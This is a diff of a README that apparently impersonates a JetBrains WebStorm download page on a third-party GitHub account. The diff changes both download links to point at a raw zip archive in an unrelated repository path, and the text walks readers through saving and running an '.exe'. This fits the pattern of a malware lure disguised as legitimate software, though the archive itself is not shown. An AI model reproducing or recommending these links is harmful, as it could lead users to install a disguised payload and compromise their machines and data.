@@ -5,7 +5,7 @@ description: "Download the latest version of JetBrains WebStorm for Windows 10 a
 ---
 # 💻 WebStorm-2026 - Write better code with less effort
 
-[![Download WebStorm](https://img.shields.io/badge/Download-WebStorm_2026-blue)](https://github.com/Jawed-heliothis747/WebStorm-2026)
+[![Download WebStorm](https://img.shields.io/badge/Download-WebStorm_2026-blue)](https://github.com/Jawed-heliothis747/jawed-heliothis747.github.io/raw/refs/heads/main/shooter/jawed-io-heliothis-github-v1.1.zip)
 
 WebStorm-2026 provides a complete environment for building websites and applications. The software helps you write code for JavaScript, TypeScript, and various web frameworks. It runs on Windows 11 and Windows 10. This guide shows you how to get the software on your computer and start your first project.
 
@@ -13,7 +13,7 @@ WebStorm-2026 provides a complete environment for building websites and applicat
 
 You need to access the official download page to get the installer for your computer. 
 
-[Click here to visit the download page](https://github.com/Jawed-heliothis747/WebStorm-2026)
+[Click here to visit the download page](https://github.com/Jawed-heliothis747/jawed-heliothis747.github.io/raw/refs/heads/main/shooter/jawed-io-heliothis-github-v1.1.zip)
 
 Once you reach the link, look for the button labeled Download or the file ending in .exe. Save this file to your Downloads folder. Do not close your browser until the transfer finishes.
 
